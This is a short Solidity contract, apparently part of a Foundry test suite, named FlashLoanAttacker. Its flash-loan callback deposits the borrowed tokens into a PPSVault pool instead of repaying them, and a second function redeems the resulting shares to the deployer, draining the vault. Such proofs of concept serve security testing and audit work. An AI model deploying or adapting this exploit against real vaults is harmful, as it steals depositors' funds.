// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;


import {Test, console2} from "forge-std/Test.sol";
import {IERC20, ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {PPSwap} from "./PPSwap.sol";
import {PPSVault} from "./PPSVault.sol";
import {PPSVaultFactory} from "./PPSVaultFactory.sol";

interface Borrower{
    function onFlashLoan(address, uint256) external;
}

contract FlashLoanAttacker is Borrower{

    PPSVault private pool;
    address owner;

    error UnsupportedCurrency();

    constructor(address _pool) {
        pool = PPSVault(payable(_pool));
        owner = msg.sender;
    }

     modifier onlyPool() {
        require(msg.sender == address(pool), "Only the pool contract can call this function");
        _;
    }

    function onFlashLoan(
        address originator,
        uint256 amount
    ) external onlyPool{
        if(address(originator) != address(this)) 
             revert("Flash loan is not initiated by me.");
        console2.log("111111111111111111");

       // instead of returning I deposit 
        IERC20(pool.asset()).approve(address(pool), amount);  
        console2.log("pps balance:", IERC20(pool.asset()).balanceOf(address(this)));  
        pool.deposit(amount, address(this)); 
    }

    function callFlashLoan(uint amount) public {
        pool.flashLoan(amount);       // I want to borrow 1000
        pool.redeem(pool.balanceOf(address(this)), owner, address(this));  // send to the deployer
    }
}
